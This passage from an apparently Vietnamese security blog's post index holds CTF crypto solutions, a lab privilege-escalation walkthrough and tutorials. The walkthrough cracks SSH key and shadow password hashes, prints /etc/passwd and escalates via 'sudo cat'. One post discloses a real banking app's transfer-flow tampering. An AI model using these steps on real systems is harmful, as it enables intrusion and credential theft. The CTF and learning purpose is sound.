11):\tfib.append(fib[i - 1] + fib[i - 2])def c2f(c):\tn = ord(c)\tb = ''\tfor i in range(10, -1, -1):\t\tif n &gt;= fib[i]:\t\t...", "content": "fibinaryBài này chúng ta có source code encrypt:fib = [1, 1]for i in range(2, 11):\tfib.append(fib[i - 1] + fib[i - 2])def c2f(c):\tn = ord(c)\tb = ''\tfor i in range(10, -1, -1):\t\tif n &gt;= fib[i]:\t\t\tn -= fib[i]\t\t\tb += '1'\t\telse:\t\t\tb += '0'\treturn bflag = open('flag.txt', 'r').read()enc = ''for c in flag:\tenc += c2f(c) + ' 'with open('flag.enc', 'w') as f:\tf.write(enc.strip())#flag.enc = '10000100100 10010000010 10010001010 10000100100 10010010010 10001000000 10100000000 10000100010 00101010000 10010010000 00101001010 10000101000 10000010010 00101010000 10010000000 10000101000 10000010010 10001000000 00101000100 10000100010 10010000100 00010101010 00101000100 00101000100 00101001010 10000101000 10100000100 00000100100' Thuật toán khá đơn giản đó là chuyển đổi kí tự sang hệ 10 sau đó so sánh với dãy số Finbonanci từ hàm xxx Nếu số hệ 10 của kí tự trong flag bé hơn Finbonanci sẽ là 0 và ngược lại là 1 cho số lớn hơn, từ đó ta có 1 số binary mới tương ứng với từng kí tự. Đối với bài này ta có thể đảo ngược thuật toán, tuy nhiên có cách nhanh hơn đó là ta tính hết tất cả các kí tự sau đó parse ra theo flag được ban tổ chức đã cho.Source code decrypt của mình:import string#gen finbonanci fib = [1, 1]for i in range(2, 11):\tfib.append(fib[i - 1] + fib[i - 2])#fib = [1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89]def c2f(c): #encrypt đổi kí tự thành 11 số binary\tn = ord(c)\tb = ''\tfor i in range(10, -1, -1):\t\tif n &gt;= fib[i]:\t\t\tn -= fib[i]\t\t\tb += '1'\t\telse:\t\t\tb += '0'\treturn bdef parsecharacter(): #tiềm các số bin tương ứng cho mỗi ký tự đọc được chars = string.printable parse = {} for c in chars: parse[c2f(c)] = c return parsedef decrypt(): flag ='' cipher=['10000100100', '10010000010', '10010001010', '10000100100', '10010010010', '10001000000', '10100000000', '10000100010', '00101010000', '10010010000', '00101001010', '10000101000', '10000010010', '00101010000', '10010000000', '10000101000', '10000010010', '10001000000', '00101000100', '10000100010', '10010000100', '00010101010', '00101000100', '00101000100', '00101001010', '10000101000', '10100000100', '00000100100'] for i in cipher: flag+=str(parsecharacter().get(i)) #lấy kí tự theo cipher qua hàm get của dict print(flag)decrypt()Flag: corctf{b4s3d_4nd_f1bp!113d}4096from Crypto.Util.number import getPrime, bytes_to_longfrom private import flagdef prod(lst):\tret = 1\tfor num in lst:\t\tret *= num\treturn retm = bytes_to_long(flag)primes = [getPrime(32) for _ in range(128)]n = prod(primes)e = 65537print(n) print(pow(m, e, n))#nc=pow(m, e, n)=15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638Bài này là một dạng cơ bản của thuật toán RSA. Ta có công thức tính encrypt m là m^e ≡ c mod n. Để decrypt ta giải theo công thức c^d ≡ m mod n.Nhưng số d là gì? d được tính theo công thức d*e ≡ 1 (mod λ(n)). Trong đó λ(n) =(p-1)*(q-1). Sử dụng sage:Với λ(n) = tn = 50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293nf = factor(n)2148630611 * 2157385673 * 2216411683 * 2223202649 * 2230630973 * 2240170147 * 2278427881 * 2293226687 * 2322142411 * 2365186141 * 2371079143 * 2388797093 * 2424270803 * 2436598001 * 2444333767 * 2459187103 * 2491570349 * 2510750149 * 2525697263 * 2572542211 * 2575495753 * 2602521199 * 2636069911 * 2647129697 * 2657405087 * 2661720221 * 2672301743 * 2682518317 * 2695978183 * 2703629041 * 2707095227 * 2710524571 * 2719924183 * 2724658201 * 2733527227 * 2746638019 * 2752963847 * 2753147143 * 2772696307 * 2824169389 * 2841115943 * 2854321391 * 2858807113 * 2932152359 * 2944722127 * 2944751701 * 2949007619 * 2959325459 * 2963383867 * 3012495907 * 3013564231 * 3035438359 * 3056689019 * 3057815377 * 3083881387 * 3130133681 * 3174322859 * 3177943303 * 3180301633 * 3200434847 * 3228764447 * 3238771411 * 3278196319 * 3279018511 * 3285444073 * 3291377941 * 3303691121 * 3319529377 * 3335574511 * 3346647649 * 3359249393 * 3380851417 * 3398567593 * 3411506629 * 3417563069 * 3453863503 * 3464370241 * 3487902133 * 3488338697 * 3522596999 * 3539958743 * 3589083991 * 3623581037 * 3625437121 * 3638373857 * 3646337561 * 3648309311 * 3684423151 * 3686523713 * 3716991893 * 3721186793 * 3760232953 * 3789253133 * 3789746923 * 3811207403 * 3833706949 * 3833824031 * 3854175641 * 3860554891 * 3861767519 * 3865448239 * 3923208001 * 3941016503 * 3943871257 * 3959814431 * 3961738709 * 3978832967 * 3986329331 * 3991834969 * 3994425601 * 4006267823 * 4045323871 * 4056085883 * 4073647147 * 4091945483 * 4098491081 * 4135004413 * 4140261491 * 4141964923 * 4152726959 * 4198942673 * 4205028467 * 4218138251 * 4227099257 * 4235456317 * 4252196909 * 4270521797 * 4276173893t = (2148630611-1)* (2157385673-1)* (2216411683-1)* (2223202649-1)* (2230630973-1)* (2240170147-1)* (2278427881-1)* (2293226687-1)* (2322142411-1)* (2365186141-1)* (2371079143-1)* (2388797093-1)* (2424270803-1)* (2436598001-1)* (2444333767-1)* (2459187103-1)* (2491570349-1)* (2510750149-1)* (2525697263-1)* (2572542211-1)* (2575495753-1)* (2602521199-1)* (2636069911-1)* (2647129697-1)* (2657405087-1)* (2661720221-1)* (2672301743-1)* (2682518317-1)* (2695978183-1)* (2703629041-1)* (2707095227-1)* (2710524571-1)* (2719924183-1)* (2724658201-1)* (2733527227-1)* (2746638019-1)* (2752963847-1)* (2753147143-1)* (2772696307-1)* (2824169389-1)* (2841115943-1)* (2854321391-1)* (2858807113-1)* (2932152359-1)* (2944722127-1)* (2944751701-1)* (2949007619-1)* (2959325459-1)* (2963383867-1)* (3012495907-1)* (3013564231-1)* (3035438359-1)* (3056689019-1)* (3057815377-1)* (3083881387-1)* (3130133681-1)* (3174322859-1)* (3177943303-1)* (3180301633-1)* (3200434847-1)* (3228764447-1)* (3238771411-1)* (3278196319-1)* (3279018511-1)* (3285444073-1)* (3291377941-1)* (3303691121-1)* (3319529377-1)* (3335574511-1)* (3346647649-1)* (3359249393-1)* (3380851417-1)* (3398567593-1)* (3411506629-1)* (3417563069-1)* (3453863503-1)* (3464370241-1)* (3487902133-1)* (3488338697-1)* (3522596999-1)* (3539958743-1)* (3589083991-1)* (3623581037-1)* (3625437121-1)* (3638373857-1)* (3646337561-1)* (3648309311-1)* (3684423151-1)* (3686523713-1)* (3716991893-1)* (3721186793-1)* (3760232953-1)* (3789253133-1)* (3789746923-1)* (3811207403-1)* (3833706949-1)* (3833824031-1)* (3854175641-1)* (3860554891-1)* (3861767519-1)* (3865448239-1)* (3923208001-1)* (3941016503-1)* (3943871257-1)* (3959814431-1)* (3961738709-1)* (3978832967-1)* (3986329331-1)* (3991834969-1)* (3994425601-1)* (4006267823-1)* (4045323871-1)* (4056085883-1)* (4073647147-1)* (4091945483-1)* (4098491081-1)* (4135004413-1)* (4140261491-1)* (4141964923-1)* (4152726959-1)* (4198942673-1)* (4205028467-1)* (4218138251-1)* (4227099257-1)* (4235456317-1)* (4252196909-1)* (4270521797-1)* (4276173893-1)Đúng là λ(n)=(p-1)*(q-1) nhưng vì ở đây chúng ta có quá nhiều p, q nên cứ tiến hành tương tự như vậy; điều này không ảnh hưởng tới bài toán.Bây giờ ta tính d: d*e ≡ 1 (mod λ(n))&lt;=&gt; d ≡ 1/e * 1 (mod λ(n))&lt;=&gt; d ≡ e^(-1) (mod λ(n))Trong python ta có thể tính từ công thức trên theo hàm pow:d = pow(e,-1,t)Vậy là các biến yêu cầu đã đủ:from Crypto.Util.number import long_to_bytesprintf(long_to_bytes(pow(c,d,n)))Flag: corctf{to0_m4ny_pr1m3s55_63aeea37a6b3b22f}Cheer (☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)" }, { "title": "[Writeup] BSides Noida CTF 2021 - Deathnote", "url": "/posts/Writeup-BSides-Noida-CTF-2021-Deathnote/", "categories": "Writeup, BSides Noida CTF 2021", "tags": "forensics, writeup, BSides", "date": "2021-08-08 00:00:00 +0700", "snippet": "Bài này cho chúng ta 1 vuln box trên tryhackme và nhiệm vụ là phải cat được flag trong root folder.Đầu tiên, mình dùng nmap để xem các port đang mở trên box này.$ nmap -vv -sV -sT -sC 10.10.164.150...", "content": "Bài này cho chúng ta 1 vuln box trên tryhackme và nhiệm vụ là phải cat được flag trong root folder.Đầu tiên, mình dùng nmap để xem các port đang mở trên box này.$ nmap -vv -sV -sT -sC 10.10.164.150Nmap scan report for 10.10.164.150Host is up, received syn-ack (0.38s latency).Scanned at 2021-08-08 17:01:46 +07 for 70sNot shown: 997 closed portsReason: 997 conn-refusedPORT STATE SERVICE REASON VERSION21/tcp open ftp syn-ack vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rw-r--r-- 1 ftp ftp 49 Aug 01 05:41 info.txt| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:10.4.25.179| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 3| vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 16:c4:7a:64:fc:07:9f:c7:1c:a1:6e:f2:3c:57:b3:89 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQ+N9q4k+biVq4CGIWzpEtEPRDO/unGV2snbUl1hT1+JIo7mPL53HQCXgLfcL+9ERgGlusCHX2C2E/0XFdpTVzJgvgwXphvBjL7E20hprdVxGdZREeN46e7VgopcMC9uajiOW82JM0jdg2nqc0GGU5G4sKOo8/pXBFySI80TrXnffLzK4CWpMRnxPqFf6DGG7kwq8MDRdY1hZR/4yPZWpqklUSXOTX71/uqZbvUze2z234No9+nEl3R/fbeU6cKyZ9jzVrPZAlBHrfYCnZKBnjjODsAAW5q61omK/uRbsST1ZEmKnvRSd2VEfs+ZrPTNhu54jBOFc6crLbYPukDOpB| 256 1d:a4:c9:b6:3d:4c:e7:61:d7:7a:e0:d2:f5:fb:84:64 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCNpTWvYwESpI0LH38YBg53wz0AGJNsxmqBAVSTNjJePODVLShMHunBSYZYbQf0lyoJ50lWItH4w9R0Bh9sOxSY=| 256 43:c8:92:9b:02:4f:4f:e7:6a:38:9a:83:32:50:25:69 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjZEe7mwBDbmCiOXQ8mMWt3WyKXXBd8iBDVodpUWE1t80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: BSidesNoida2021Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelTa thấy rằng box đang mở dịch vụ ftp ở port 21 và không có cơ chế xác thực, port 22 chạy dịch vụ ssh, và port 80 chạy http.Mình thử truy cập port 21 để xem có lấy được file gì không thì chỉ nhận được 1 file info.txt không có thông tin gì.$ cat info.txt you know how to find secret files :PHave Fun :)Tiếp đến dịch vụ HTTP, chỉ là một trang web bình thường, viewsource thì tác giả có hint bằng dòng comment: &lt;!-- Don't touch my s3cr3t file--&gt;. Vậy thì làm thế nào để get được file s3cr3t này? Trong mục miêu tả của box tác giả cung cấp cho ta một file wordlist.txt nên mình tải về và dò tìm xem các URI khác của box bằng gobuster.$ gobuster dir -w wordlist.txt -u 10.10.164.150 1 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.164.150[+] Method: GET[+] Threads: 10[+] Wordlist: wordlist.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================/.htaccess (Status: 403) [Size: 278]/.hta (Status: 403) [Size: 278]/.htpasswd (Status: 403) [Size: 278]/index.html (Status: 200) [Size: 4173]/s3cr3t (Status: 200) [Size: 63] /ryuk.apples (Status: 200) [Size: 1766]/robots.txt (Status: 200) [Size: 17] /robots.txt (Status: 200) [Size: 17] /server-status (Status: 403) [Size: 278] Truy cập trang ryuk.apples cho ta một file private key dùng cho việc kết nối SSH và đã encrypt, việc cần làm là phải cần dò passphase cho file pem này để thực hiện kết nối SSH.$ wget https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py$ python ssh2john.py ryuk.apples &gt; pem.hash$ john --wordlist=wordlist.txt pem.hash 130 ⨯Using default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 2 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press 'q' or Ctrl-C to abort, almost any other key for statusl1ght1skir4 (ryuk.apples)1g 0:00:00:00 DONE (2021-08-08 17:15) 100.0g/s 461400p/s 461400c/s 461400C/s zone..ztSession completedSau khi có được passphase mình thật sự không biết username để truy cập là gì, cũng nhờ đứa em wibu nó thông não ryuk là thần chết trong deathnote tương tự như tên đề bài. Đoạn passphase cho file SSH cũng là password login cho user ryuk.Nhưng trên box thì user ryuk không có quá nhiều thông tin cũng như không thuộc group sudo và không có ứng dụng nào thực thi dưới quyền sudo cho user. Một mặt, tác giả cho ta 2 file passwd và shadow trên thư mục của home của ryuk nên mình ngó thử xem sao.$ cat /etc/passwd root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologinsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologinsyslog:x:102:106::/home/syslog:/usr/sbin/nologinmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin_apt:x:104:65534::/nonexistent:/usr/sbin/nologinuuidd:x:105:111::/run/uuidd:/usr/sbin/nologinavahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologindnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinrtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologinspeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falsewhoopsie:x:111:117::/nonexistent:/bin/falsekernoops:x:112:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologinsaned:x:113:119::/var/lib/saned:/usr/sbin/nologinpulse:x:114:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinavahi:x:115:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologincolord:x:116:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologinhplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/falsegeoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologingnome-initial-setup:x:119:65534::/run/gnome-initial-setup/:/bin/falsegdm:x:120:125:Gnome Display Manager:/var/lib/gdm3:/bin/falsemrgrep:x:1000:1000:BSidesNoida,,,:/home/mrgrep:/bin/bashftp:x:121:127:ftp daemon,,,:/srv/ftp:/usr/sbin/nologinryuk:x:1001:1001::/home/ryuk:/bin/shsshd:x:122:65534::/run/sshd:/usr/sbin/nologinlight:x:1002:1002::/home/light:/bin/shChú ý đến user light, có thể sẽ có gì đó hay ho cho user này để mình leo lên quyền root. Từ file shadow, passwd đã cho, mình hoàn toàn có thể lấy được password của user light.$ unshadow passwd shadow &gt; pass$ john --wordlist=wordlist.txt pass 1 ⨯Using default input encoding: UTF-8Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])Cost 1 (iteration count) is 5000 for all loaded hashesWill run 2 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusMrBS1d3sGrepN0ida@!1337 (light)l1ght1skir4 (ryuk)Warning: Only 6 candidates left, minimum 8 needed for performance.2g 0:00:00:05 DONE (2021-08-08 11:17) 0.3539g/s 816.6p/s 2040c/s 2040C/s zone..ztUse the \"--show\" option to display all of the cracked passwords reliablySession completedSau khi SSH của user light, mình thử sudo -l để xem có lệnh nào có thể sử dụng để leo lên root được không.$ sudo -lMatching Defaults entries for light on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser light may run the following commands on ubuntu: (ALL) NOPASSWD: /bin/catOh well ✪ ω ✪$ sudo cat /root/root.txtBSNoida{Pr1vEsc_w4a_E4sy_P3a5y}Cheer (☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)" }, { "title": "[Research] Học cryptography (P.1)", "url": "/posts/Reasearch-Hoc-cryptography-(P.1)/", "categories": "Research, Cryptography", "tags": "research, cryptography", "date": "2021-07-18 00:00:00 +0700", "snippet": "Dịch giặc hoành hành, nên mình có thời gian thêm ở nhà làm việc và research một vài thứ mới, hay ho và để bổ sung kiến thức. Mã hóa là một phần của CTF và ATTT; nên mình quyết định học crypto làm c...", "content": "Dịch giặc hoành hành, nên mình có thời gian thêm ở nhà làm việc và research một vài thứ mới, hay ho và để bổ sung kiến thức. Mã hóa là một phần của CTF và ATTT; nên mình quyết định học crypto làm crypto viết crypto, một mảng mà mình chưa bao giờ đụng tới trước giờ.0x01: Mật mã họcMật mã có 2 dạng là mật mã hiện đại và mật mã cổ điện; hiện tại thì mình tập trung nhiều hơn về cách thức mã hóa và giải mã cho mật hiện đại. Các dạng mật mã cổ điển như Rot, Vigenere cipher mình sẽ không tập trung hoặc sẽ tập trung trong phần khác.Mật mã hiện đại có thể kể đến những thuật toán nổi tiếng bao gồm cả mã hóa đối xứng và mã hóa bất đối xứng như MD5, SHA, RSA, DES, AES,…0x02: Mã hóa đối xứng và bất đối xứngMã hóa đối xứng (Symmetric-key cryptography)Có thế nói đây là kỹ thuật mã hóa đơn giản nhất thực hiện nhanh nhất.Kỹ thuật này dùng chung một key (khóa) để mã hóa và giải mã.Mã hóa đối xứng phổ biến là Rot, Vigenere, AES, DES.Mã hóa bất đối xứng (Asymmetric-key Cryptography)Kỹ thuật mã hóa phức tạp và vì thế sẽ tốn thời gian để mã hóa, giải mã.Kỹ thuật này sẽ sử dụng 2 khóa, khóa công khai (public key), khóa bí mật (private key).Khi một thông tin được mã hóa bởi khóa công khai thì chỉ có thể dùng khóa bí mật để giải mã, nhưng thông tin mã hóa bằng khóa bí mật thì có thể dùng khóa công khai để giải mã.0x03: Học từ toánYeah, mật mã học về cơ bản là những thuật toán sử dụng toán và lý thuyết số để thực hiện việc mã hóa, giải mã.Ước chung lớn nhất (GCD) Ước số: Nếu có số tự nhiên a chia hết cho b, thì ta nói b là ước của a.Ví dụ: 18 % 6 = 0 =&gt; 6 là ước của 18 Ước chung lớn nhất của hai hay nhiều số nguyên là số nguyên dương lớn nhất thuộc tập ước chung các số đó.Ví dụ: UCLN(18,30) = 6 Số nguyên tố Là số chỉ chia hết cho 1 và chính nó:Ví dụ: 2, 3, 5, 7, 11, 13,…Số nguyên tố cùng nhau Hai số nguyên tố cùng nhau là 2 số có UCLN là 1.Ví dụ: 9 và 10; 15 và 37Số đồng dư Cho 2 số a, b. Nếu a và b chia cho N có cùng số dư k thì ta gọi a và b là 2 số đồng dư theo n.Kí hiệu a ≡ b mod NVí dụ 14 ≡ 2 mod 12, vì 14 % 12 = 2 và 2 % 12 = 2.Khi a ≡ b mod N, ta sẽ luôn tồn tại một số k sao cho:a - b = knVì vậy:a = kn + bXét ví dụ 14 ≡ 2 mod 12Ta có: 14 - 12 = k.12 =&gt; k = 1a = kn + b &lt;=&gt; 14 = 1*12 + 2 (điều này đúng)Phần một đến đây thôi, phần 2 mình sẽ tập trung chủ yếu hơn về số nguyên tố và số đồng dư cùng các tính chất.Cheer (☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)" }, { "title": "[Lỗi vu vơ] Thay đổi số tiền chuyển khoản SMS gửi về của ngân hàng MQĐ", "url": "/posts/Loi-vu-vo-Thay-doi-so-tien-chuyen-khoan-SMS-cua-ngan-hang-MQD/", "categories": "Research, Mobile, Android", "tags": "research, android", "date": "2021-05-16 00:00:00 +0700", "snippet": "Vài hôm trước mình có được một người anh nhờ reverse và bypass các tính năng bảo mật cho ứng dụng của ngân hàng MQĐ trên Android; cũng lâu rồi chưa làm gì đụng lại đến Android nên mình thấy đây là ...", "content": "Vài hôm trước mình có được một người anh nhờ reverse và bypass các tính năng bảo mật cho ứng dụng của ngân hàng MQĐ trên Android; cũng lâu rồi chưa làm gì đụng lại đến Android nên mình thấy đây là một cách tốt để research thêm về các kĩ thuật trên Android.0x01: BypassVề cơ bản mình thấy app được bảo mật và kiểm tra môi trường mà ứng dụng dược chạy rất kỹ, thông qua một nhà cung cấp thư ba mà ngân hàng MQĐ đã tích hợp vào source code chỉ cần vi phạm thì app sẽ dừng chạy hoặc crash. Các trường mà ứng dụng thứ ba kiểm tra bao gồm:- Ứng dụng phải đang chạy trên thiết bị thật (Anti-emulator)- Thiết bị có bị root hay chưa (Anti root)- Ứng dụng có bị chặn gói tin hay không (Cert pinning)Cách thức bypass mình không tiện nói ở bài đăng này; có thể sẽ là một bài đăng trong tương lai hay cũng có thể là không có vì nhiều nguyên nhân.0x02: Nghịch ngợmSau khi bypass toàn bộ mình đi vào trong và thử intercept các tính năng quan trọng; ứng dụng ngân hàng mà phải thử ngay giao thức chuyển tiền đầu tiên chứ 😌Khi check sơ qua thì mình thấy luồng thực thi khi gọi API chuyển tiền của ứng dụng là như sau:- Transaction -&gt; CheckPayment1 -&gt; GenSMS_OTP -&gt; CheckPayment2+OTP -&gt; CheckBalance -&gt; DoTransactionTuy nhiên trong quá trình thì mình nhận thấy việc GenSMS_OTP hoàn toàn không kiểm tra bước CheckPayment1 và không có các hàm mã hóa khi xử lý ở client để đảm bảo tính toàn vẹn nên có thể dễ dàng thay đổi các tham số.Tràn số 0 luôn mà, híc ước gì đống trên là của mình chuyển thật. Một thanh niên khố rách áo ôm cho hay. 😥😪Lỗi này mình đã nhờ người anh của mình report lại với phía bên kia nhưng không nhận được phản hồi và cũng đã hơn 14 ngày tính từ ngày report nên mình up lên đây cho mọi người cùng đọc vì lỗi này tính ra mức impact cũng không cao lắm chủ yếu có thể dùng là đi phishing hay lừa đảo bằng ảnh chụp màn hình thôi.Cheer (☞ﾟヮﾟ)☞☜(ﾟヮﾟ☜)" }, { "title": "Decompile và Recompile ứng dụng APK", "url": "/posts/Decompile-va-Recompile-APK/", "categories": "Research, Mobile, Android", "tags": "research, android", "date": "2021-04-17 00:00:00 +0700", "snippet": "Cách mình patch code và nghịch ngợm 1 file APK.0x01: Các công cụ cần thiết:Các bạn tải những công cụ: apktool_Công cụ giúp chúng ta decompile từ 1 file APK sang mã nguồn smali và Recompile thành 1...", "content": "Cách mình patch code và nghịch ngợm 1 file APK.0x01: Các công cụ cần thiết:Các bạn tải những công cụ: apktool_Công cụ giúp chúng ta decompile từ 1 file APK sang mã nguồn smali và Recompile thành 1 file APK mới. keytool_Công cụ giúp tạo certificate. jarsigner_Công cụ giúp ký chữ ký được tạo từ keytool. zipalign_Công cụ tinh chỉnh nén cho file APK.0x02: Cách cài đặtNhững công cụ được nêu trên đều có thể dễ dàng cài đặt trên các package của Linux. Ở đây mình sử dụng Ubuntu:$ sudo apt install -y apktool zipalign default-jdkTrên hệ điều hành Windows thì các bạn phải cài từng gói riêng và thêm path vào Enviroment để các công cụ trên có thể hoạt động tốt nhất.0x03: DecompileCách mình thường làm đó là:$ apktool d &lt;app_name&gt;.apkSau đó chỉnh sửa smali code của file apk vừa decompile.Cách khác giúp bạn nào chưa quen smali code vẫn có thể giúp bạn dễ patch hơn bằng code java, tuy nhiên cách này mình không dùng thường xuyên vì nó phải convert quá nhiều lần dẫn đến app sau khi patch bị lỗi và không thể hoạt động.$ apktool d -rs &lt;app_name&gt;.apkCách này sẽ không decompile mã nguồn sang smali code mà sẽ để ở dạng đuôi .dex.Để đọc và chỉnh sửa dễ dàng hơn, ta cài đặt dex2jar. Sử dụng jd-gui để đọc code và dùng jar trong jdk để compile file mới sau khi đã chỉnh sửa và recompile lại file apk.0x04: RecompileSau khi đã chỉnh sửa, chúng ta cần đóng gói lại thành 1 file APK mới.$ apktool bTiếp đến cần tạo certificate để có thể kí trước khi xuất bản:$ keytool -genkey -v -keystore apk-sign.key -alias alias_name -keyalg RSA -keysize 2048 -validity 10000Khi các bạn tạo cert sẽ có yêu cầu tạo password, cứ nhập gì cũng được nhưng hãy chắc chắn là các bạn nhớ nó vì password sẽ được nhập trong bước kí file APK.$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore apk-sign.key &lt;new_app_name&gt;.apk alias_nameCuối cùng là dùng zipalign:$ zipalign -v 4 my_application.apk my_application-aligned.apkCheer (☞ﾟヮﾟ)☞☜(ﾟヮﾟ☜)" }, { "title": "USB PCAP - Phần 1 Bàn phím", "url": "/posts/USB-PCAP-P1-Keyboard/", "categories": "Research, Forensics", "tags": "research", "date": "2021-04-07 00:00:00 +0700", "snippet": "Một bài chia sẻ, tổng hợp kiến thức cá nhân giúp mình hoàn thành các thử thách truyền thông tin sử dụng giao thức USB sang PC/Laptop được capture thông qua Wireshark hoặc T-shark và lưu dưới tệp ti...", "content": "Một bài chia sẻ, tổng hợp kiến thức cá nhân giúp mình hoàn thành các thử thách truyền thông tin sử dụng giao thức USB sang PC/Laptop được capture thông qua Wireshark hoặc T-shark và lưu dưới tệp tin Pcap/Pcapng.0x01: Các định dạng truyền dữ liệuCó 4 định dạng truyền dữ liệu thông qua USB đó là:- Control Transfers (0x02)- Interrupt Transfers (0x01)- Isochronous Transfers (0x00)- Bulk Transfers (0x03)Với các mã hex tương ứng cho câu lệnh lọc gói tin trên Wireshark, ví dụ usb.transfer_type == 0x01 sẽ giúp chúng ta lọc ra toàn bộ các gói tin được gửi đi dưới phương thức Interrupt.Control TransfersĐây là dạng giao thức được sử dụng cho việc thiết lập USB và trạng thái của thiết bị cũng như endpoint.Interrupt TransfersDạng giao thức được dùng để truyền dữ liệu từ bàn phím, chuột đến máy tínhIsochronous TransfersDạng giao thức được dùng để truyền tải âm thanh đến các thiết bị ngoại vi âm thanh như tai nghe, loa,…Bulk TransfersDạng giao thức được dùng để truyền tải dữ liệu lớn như là một bức ảnh được gửi từ máy tính qua máy in hoặc từ máy quét sang máy tính.0x02: Đọc dữ liệu được nhập từ bàn phímXác định và cách đọc dữ liệuVì dữ liệu truyền vào từ bàn phím thuộc interrupt 